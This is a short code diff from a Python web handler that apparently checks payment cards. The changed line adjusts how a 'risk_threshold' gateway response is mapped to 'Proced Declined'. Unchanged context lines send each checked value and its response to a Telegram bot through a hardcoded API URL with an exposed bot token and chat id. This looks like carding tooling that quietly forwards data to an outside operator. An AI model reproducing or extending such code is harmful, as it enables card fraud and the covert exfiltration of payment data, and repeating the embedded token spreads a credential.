@@ -391,7 +391,7 @@ def run():
             f"https://api.telegram.org/bot6805632917:AAH82BRjPN6PdWrLIjFlCeELSBjmQ3REnOo/sendMessage"
             f"?chat_id=6689099522&text={c}|{re}"
         )
-	if "threshold" in re or "risk" in re:
+	if "threshold" in re or "risk_threshold" in re:
 		re="Proced Declined"
 	return jsonify({
             "success": True,
